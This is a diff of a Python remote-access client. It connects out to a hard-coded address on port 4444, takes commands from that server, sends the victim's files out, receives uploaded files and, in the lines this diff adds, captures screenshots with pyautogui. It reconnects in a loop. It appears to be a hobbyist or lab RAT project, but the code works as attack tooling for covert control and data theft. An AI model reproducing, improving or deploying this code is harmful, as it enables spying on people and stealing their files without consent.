@@ -2,6 +2,7 @@ import socket
 import os
 import subprocess
 from time import sleep
+import pyautogui
 
 class client:
 
@@ -14,22 +15,19 @@ class client:
 
 
 
-    def download (self,path_input):
+    def client_upload (self,path_input):
         if os.path.exists(path_input):
-            chunk_read="Yes"
+            chunk="Yes".encode()
+            self.client_socket.send(chunk)
             with open(path_input,"rb") as file:
-                chunk_read += file.read(2048).decode()
-                chunk = file.read(2048).decode()
-                while len(chunk) >0:
-                    chunk=file.read(2048).decode()  
-                    chunk_read+=chunk             
-                chunk_read+="ENDOFMESSAGE"
-                chunk_Byte=chunk_read.encode()
-                self.client_socket.sendall(chunk_Byte)
+                file_data=file.read()
+                self.client_socket.sendall(file_data)
+                chunk="ENDOFMESSAGE".encode()
+                self.client_socket.send(chunk)
                 file.close()
                 
 
-    def upload(self,file_name):
+    def client_download(self,file_name):
         response = self.client_socket.recv(2048)
         total_response=""
         if response.decode().startswith("Yes"):
@@ -53,14 +51,15 @@ class client:
                 file.close()
 
         else:
-            response = "No"
+            response = "No!"
             self.client_socket.send(response.encode())
             exit
 
 
-    def client_connect(self):
-        self.client_socket.connect((self.server_ip,int(self.server_port)))
+    def client_connector(self):
         try:
+            self.client_socket.connect((self.server_ip,int(self.server_port)))
+            print("Client connected successfully\n")
             while True:
                 command=self.client_socket.recv(2048)
                 command_string = command.decode()
@@ -76,7 +75,7 @@ class client:
 
                 if command_string.startswith("download"):
                     path_input=command_string.strip("download ")
-                    self.download(self,path_input)
+                    self.client_upload(path_input)
                     continue
 
                 if command_string.startswith("upload"):
@@ -87,7 +86,21 @@ class client:
                     file_name="./Uploads/"+file_name_with_ext
                     while os.path.exists(file_name):
                         file_name+="(1)"
-                    self.upload(self,file_name)
+                    self.client_download(file_name)
+                    continue
+
+                elif command_string=="screenshot":
+                    if not os.path.exists("./Screenshots"):
+                        os.makedirs("./Screenshots")
+                    x=0
+                    file_name=""
+                    file_name = os.path.join("./Screenshots/", f"{x}.png")
+                    screenshot = pyautogui.screenshot()
+                    while os.path.exists(file_name):
+                        x+=1
+                        file_name = os.path.join("./Screenshots/", f"{x}.png")
+                    screenshot.save(file_name)
+                    print("Screenshot saved at:{}".format(file_name))
                     continue
                     
                     
@@ -103,21 +116,22 @@ class client:
              print(f"Connection refused. Make sure the server is running at {self.server_ip}:{self.server_port}")
         except socket.gaierror:
             print(f"Address resolution error. Could not resolve {self.server_ip}.")
-        except Exception: print("Exception occured")
+        except Exception as e: print(f"Exception occurred: {e}")
 
         finally:
             print("Client connection closed.")
             if self.client_socket and not self.client_socket._closed:
                 self.client_socket.close()
+                
 
 
 
 if __name__=="__main__":
-    new_client = client("127.0.0.1","7900")
-    new_client.client_connect()
+    new_client = client("172.16.181.132","4444")
+    new_client.client_connector()
     while True:
         try:
-            new_client.client_connect()
+            new_client.client_connector()
         except KeyboardInterrupt:
             print("\nClient shutting down.")
             break
